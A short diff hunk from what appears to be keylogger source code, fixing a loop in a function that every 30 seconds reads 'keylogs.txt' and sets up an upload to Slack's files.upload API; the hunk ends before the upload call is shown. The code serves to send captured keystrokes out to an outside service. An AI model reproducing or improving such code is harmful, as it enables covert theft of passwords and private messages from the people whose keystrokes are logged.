@@ -44,7 +44,7 @@ def get_file_content(file_name):
 
 # Post file with slack
 def send_file():
-    while TRUE:
+    while True:
         sleep(30)
         content = get_file_content('keylogs.txt')
         url = "https://slack.com/api/files.upload"
